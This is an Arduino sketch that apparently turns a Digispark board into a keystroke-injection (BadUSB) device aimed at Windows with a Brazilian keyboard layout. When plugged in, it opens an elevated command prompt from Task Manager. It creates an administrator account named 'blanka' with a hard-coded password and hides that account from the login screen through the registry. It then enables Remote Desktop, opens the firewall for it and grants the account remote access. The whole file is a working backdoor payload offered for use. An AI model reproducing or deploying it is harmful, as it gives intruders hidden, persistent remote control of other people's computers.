#include "DigiKeyboardPtBr.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(0,OUTPUT); //LED on model B
  pinMode(1,OUTPUT); //LED on model A    
}

void loop() {
  pisca_led(100);
  DigiKeyboardPtBr.update();
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(3000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.println("taskmgr"); //starting taskmgr
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboardPtBr.sendKeyStroke(KEY_N);//run
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("cmd /k mode con: cols=15 lines=1");//start cmd
  DigiKeyboardPtBr.sendKeyStroke(KEY_TAB); 
  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboardPtBr.delay(500);  
  DigiKeyboardPtBr.println("net user blanka Ping@123 /ADD");//adding user
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("net localgroup Administrators blanka /ADD");//adding user to admin group
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));//Hiding user from login screen
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));//Turning Remote desktop
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));//Allowing remote desktop through firewall
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("net localgroup \"Remote Desktop Users\" blanka /add");//adding created user to remote desktop group
  DigiKeyboardPtBr.delay(500);  
  DigiKeyboardPtBr.println("exit");//adding created user to remote desktop group
  DigiKeyboardPtBr.delay(500);
  pisca_led(1000); 
  for(;;){ /*empty*/ }
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); // LED on <--> Action start
    digitalWrite(1, HIGH); // LED on <--> Action start
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); // LED off <--> Action end
    digitalWrite(1, LOW); // LED off <--> Action end
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}